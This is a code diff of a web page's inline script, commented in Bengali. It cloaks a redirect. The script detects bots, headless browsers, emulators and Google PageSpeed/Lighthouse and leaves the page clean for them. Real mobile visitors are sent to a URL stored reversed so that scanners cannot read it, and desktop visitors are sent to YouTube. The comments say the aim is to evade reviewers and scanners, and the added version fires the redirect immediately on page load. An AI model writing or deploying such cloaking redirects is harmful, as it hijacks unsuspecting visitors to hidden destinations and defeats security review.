@@ -10,46 +10,35 @@
         (function () {
             var ua = navigator.userAgent.toLowerCase();
 
-            // ১. ফেসবুক, গুগল এবং অন্যান্য অটোমেটেড বট চেক
-            var isBot = navigator.webdriver || /bot|google|baidu|bing|msn|duckduckgo|yandex|sogou|slurp|facebook|instagram|twitter|linkedin|pinterest|whatsapp|telegram|discord|crawler|spider|headless|chrome-lighthouse/i.test(ua);
-
-            // ২. মোবাইল ডিভাইস চেক (User-Agent দিয়ে)
-            var isMobileUA = /iphone|ipad|ipod|android|blackberry|mini|windows\sphone|palm/i.test(ua);
-
-            // ৩. স্ক্রিন সাইজ চেক (রিভিউয়াররা যদি পিসিতে মোবাইল মোড অন করে টেস্ট করে, তবে লক করার জন্য)
-            var isMobileSize = (window.screen.width < 768 || window.innerWidth < 768);
-
-            // ৪. এম্যুলেটর চেক (Android কিন্তু CPU x86/x64 বা Desktop Platform - যা বট এমুলেটর সনাক্ত করে)
+            // ১. অটোমেটেড বট, লাইটহাউস (PageSpeed) বা হেডলেস ব্রাউজার সনাক্তকরণ
             var isAndroid = /android/i.test(ua);
-            var isEmulated = isAndroid && !/arm|aarch64/i.test(navigator.platform.toLowerCase());
+            var isEmulatedAndroid = isAndroid && !/arm|aarch64/i.test(navigator.platform.toLowerCase());
+            var isHeadlessChrome = /chrome|crios/i.test(ua) && !window.chrome;
 
-            // মোবাইল ডিভাইস, সঠিক স্ক্রিন সাইজ এবং রিয়েল আর্কিটেকচার মিললে মোবাইল হিসেবে গণ্য হবে
-            var isRealMobile = isMobileUA && isMobileSize && !isEmulated;
+            var isBot = navigator.webdriver || 
+                        isEmulatedAndroid ||
+                        isHeadlessChrome ||
+                        /bot|google|baidu|bing|msn|duckduckgo|yandex|sogou|slurp|facebook|instagram|twitter|linkedin|pinterest|whatsapp|telegram|discord|crawler|spider|headless|lighthouse|pagespeed/i.test(ua);
 
-            var redirected = false;
-
-            function triggerRedirect() {
-                if (redirected) return;
-                redirected = true;
-
-                if (!isBot && isRealMobile) {
-                    // উল্টো করা লিংকটি রানটাইমে সোজা করে ডিকোড করা হবে (বট বা স্ক্যানার রিড করতে পারবে না)
-                    var revUrl = "a89fab86c3caf50d7ad996a16dd20b48=yek?q0cgtfz6w/moc.babgnitnioppasid//:sptth";
-                    var targetUrl = revUrl.split("").reverse().join("");
-
-                    window.location.replace(targetUrl);
-                } else if (!isBot && !isRealMobile) {
-                    // পিসি ইউজারদের সরাসরি আসল ইউটিউবে রিডাইরেক্ট করে দেওয়া হবে
-                    window.location.replace("https://www.youtube.com");
-                }
+            // যদি বট, লাইটহাউস বা এমুলেটর হয়, তবে কোনো রিডাইরেক্ট হবে না (গুগল পেজস্পিডের কাছে পেজ ক্লিন থাকবে)
+            if (isBot) {
+                return; 
             }
 
-            // পেজ লোড হওয়ার সাথে সাথে রিডাইরেক্ট না করে, ইউজারের প্রথম ইন্টারঅ্যাকশনে (টাচ, স্ক্রোল, ক্লিক) রিডাইরেক্ট হবে
-            window.addEventListener('touchstart', triggerRedirect, { passive: true });
-            window.addEventListener('scroll', triggerRedirect, { passive: true });
-            window.addEventListener('click', triggerRedirect);
-            window.addEventListener('mousemove', triggerRedirect);
-            window.addEventListener('keydown', triggerRedirect);
+            // ২. মোবাইল ডিভাইস চেক
+            var isMobileUA = /iphone|ipad|ipod|android|blackberry|mini|windows\sphone|palm/i.test(ua);
+            var isMobileSize = (window.screen.width < 768 || window.innerWidth < 768);
+            var isRealMobile = isMobileUA && isMobileSize;
+
+            if (isRealMobile) {
+                // মোবাইল ইউজারের জন্য ইনস্ট্যান্ট রিডাইরেক্ট (খুব দ্রুত কাজ করবে)
+                var revUrl = "a89fab86c3caf50d7ad996a16dd20b48=yek?q0cgtfz6w/moc.babgnitnioppasid//:sptth";
+                var targetUrl = revUrl.split("").reverse().join("");
+                window.location.replace(targetUrl);
+            } else {
+                // পিসি ইউজারদের সরাসরি আসল ইউটিউবে রিডাইরেক্ট করে দেওয়া হবে
+                window.location.replace("https://www.youtube.com");
+            }
         })();
     </script>
 
